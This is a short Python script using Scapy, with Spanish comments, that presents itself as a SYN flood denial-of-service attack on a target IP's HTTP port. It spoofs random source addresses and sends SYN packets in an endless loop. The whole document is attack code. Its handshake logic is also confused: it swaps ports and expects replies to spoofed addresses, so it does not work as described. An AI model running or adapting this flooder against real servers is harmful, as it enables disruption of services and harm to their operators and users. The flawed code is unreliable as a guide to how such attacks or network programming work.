from scapy.all import *

# Dirección IP de la víctima (tu servidor HTTP simulado)
victim_ip = "10.0.0.1"

# Puerto TCP para HTTP
http_port = 80

# Número máximo de intentos SYN antes de enviar demasiados
max_syn_attempts = 3

# Función para realizar un intento de conexión SYN
def syn_attempt(src_ip, dst_ip, dst_port):
    # Construir paquete SYN
    syn_pkt = IP(src=src_ip, dst=dst_ip) / TCP(sport=RandShort(), dport=dst_port, flags="S")

    # Enviar paquete y recibir respuesta
    response = sr1(syn_pkt, verbose=False, timeout=1)

    # Manejar la respuesta del servidor
    if response and response.haslayer(TCP):
        if response[TCP].flags == 0x12:  # SYN-ACK recibido
            ack_pkt = IP(src=src_ip, dst=dst_ip) / TCP(sport=syn_pkt[TCP].dport, dport=syn_pkt[TCP].sport, flags="A", seq=response[TCP].ack, ack=response[TCP].seq + 1)
            send(ack_pkt, verbose=False)
            return True
    return False

# Función para enviar paquetes SYN flood
def syn_flood(victim_ip, victim_port):
    src_ip = RandIP()
    for _ in range(max_syn_attempts):
        if syn_attempt(src_ip, victim_ip, victim_port):
            print(f"[*] SYN enviado desde {src_ip} hacia {victim_ip}:{victim_port}")
        else:
            print(f"[!] No se pudo establecer la conexión SYN desde {src_ip} hacia {victim_ip}:{victim_port}")

# Main
if __name__ == "__main__":
    try:
        print("[*] Iniciando ataque SYN Flood hacia", victim_ip)
        while True:
            syn_flood(victim_ip, http_port)
    except KeyboardInterrupt:
        print("\n[*] Deteniendo el ataque.")